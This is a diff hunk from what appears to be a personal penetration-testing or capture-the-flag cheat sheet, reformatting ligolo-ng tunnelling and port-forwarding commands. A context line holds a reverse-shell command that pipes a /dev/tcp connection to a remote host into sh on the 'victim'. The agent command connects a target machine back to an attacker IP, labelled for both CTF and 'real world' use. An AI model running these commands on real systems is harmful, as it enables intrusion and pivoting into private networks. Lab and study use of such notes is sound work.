@@ -61,14 +61,14 @@ cat < /dev/tcp/10.10.10.10/80 | sh #Victim
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # ligolo-ng port forwarding tool commands:
-   1. sudo ip tuntap add user root mode tun ligolo
-2. sudo ip link set ligolo up
-2  ./proxy -selfcert (for hacking ctf machines)
-3 ./proxy -autocert (for real world)
-4  ./agent -connect 10.10.16.35:11601 -ignore-cert (target machine use this command)
-5 session (choose session or simply press senter)
-6 start (use this command in ligolo)
-7 sudo ip route add 240.0.0.1/32 dev ligolo (to route the local running services to our machine magic ip)
+    1. sudo ip tuntap add user root mode tun ligolo
+    @ sudo ip link set ligolo up
+   # ./proxy -selfcert (for hacking ctf machines)
+ # ./proxy -autocert (for real world)
+   # ./agent -connect 10.10.16.35:11601 -ignore-cert (target machine use this command)
+  # session (choose session or simply press senter)
+ # start (use this command in ligolo)
+ # sudo ip route add 240.0.0.1/32 dev ligolo (to route the local running services to our machine magic ip)
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Port Forwarding using SSH
